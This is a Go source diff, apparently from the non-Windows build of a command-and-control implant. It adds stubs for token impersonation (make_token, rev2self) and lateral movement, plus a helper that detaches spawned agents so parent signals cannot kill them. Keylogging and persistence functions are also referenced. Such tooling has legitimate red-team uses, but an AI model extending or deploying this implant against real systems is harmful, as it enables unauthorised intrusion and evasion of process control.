@@ -7,6 +7,7 @@ import (
 	"errors"
 	"net/http"
 	"os/exec"
+	"syscall"
 	"time"
 )
 
@@ -14,6 +15,12 @@ func newCommand(name string, args ...string) *exec.Cmd {
 	command := exec.CommandContext(agentContext, name, args...)
 	command.WaitDelay = 2 * time.Second
 	return command
+}
+
+// detachSpawnCommand starts a spawned agent in its own session so signals
+// delivered to the parent's process group cannot stop it.
+func detachSpawnCommand(command *exec.Cmd) {
+	command.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
 }
 
 func loadPluginPE(*http.Client, *config, string, string, string) (string, error) {
@@ -42,4 +49,38 @@ func keylogAction(string) (string, string, error) {
 
 func persistenceAction(bool, *config) (string, error) {
 	return "", errors.New("persistence requires Windows")
+}
+
+func makeTokenAction(domain, user, password string) (string, error) {
+	return "", errors.New("network identity commands require the Windows agent build")
+}
+
+func rev2selfAction() (string, error) {
+	return "", errors.New("network identity commands require the Windows agent build")
+}
+
+func applyCommandToken(*exec.Cmd) {}
+
+func processUserIdentity() string { return username() }
+
+func activeNetworkIdentity() string { return "" }
+
+func runAsWindowsService() bool { return false }
+
+func runLateralChild([]string) error {
+	return errors.New("lateral movement requires the Windows agent build")
+}
+
+func runLateralCleanupChild([]string) error {
+	return errors.New("lateral movement requires the Windows agent build")
+}
+
+func runLateralDetach([]string) error {
+	return errors.New("lateral movement requires the Windows agent build")
+}
+
+func newBoundedCommand(ctx context.Context, name string, args ...string) *exec.Cmd {
+	command := exec.CommandContext(ctx, name, args...)
+	command.WaitDelay = 2 * time.Second
+	return command
 }
